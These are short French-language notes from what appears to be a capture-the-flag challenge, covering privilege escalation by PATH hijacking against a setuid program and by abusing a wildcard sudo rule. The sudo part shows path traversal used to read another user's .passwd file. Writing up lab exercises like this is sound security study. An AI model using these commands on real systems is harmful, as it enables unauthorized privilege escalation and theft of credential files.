### Utilisation du PATH

Avec script c u+s

Copy de cat comme ls dans /tmp ou /var/tmp: $ cp /bin/cat /tmp/ls (n'importe quelle commande dont on a besoin cat ou nano ou autre)

modif du PATH dans lequelle les commande vont être exécutée: $ PATH=/tmp

éxecution du script qui va donc utiliser le cat comme ls

### Les dangers de sudo

sudo permet d'exécuter des commandes en tant qu'un autre utilisateur

sudo -l permet de voir quelle commandes peuvent être lancée et par quel utilisateur

sudo -u $user $commande

dans le cas de cette exercice:

'''
$ sudo -l
User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*

$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/*

$ sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
'''
